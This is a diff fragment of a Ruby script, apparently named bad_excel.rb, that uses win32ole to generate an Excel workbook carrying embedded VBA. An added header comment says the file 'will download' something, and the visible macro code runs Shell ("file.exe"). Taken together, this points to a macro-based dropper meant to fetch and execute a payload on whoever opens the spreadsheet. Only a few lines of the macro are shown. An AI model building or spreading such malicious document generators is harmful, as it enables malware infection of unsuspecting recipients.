@@ -1,3 +1,7 @@
+##################
+# create excel file that will download...
+# ./bad_excel.rb 
+##################
 require 'win32ole'
 
 def bad_excel(vbs_file, excel_file)
@@ -37,4 +41,5 @@ Shell ("file.exe")
 
 End Sub
 VBSCode
+
 bad_excel(vbs, 'badexcel')
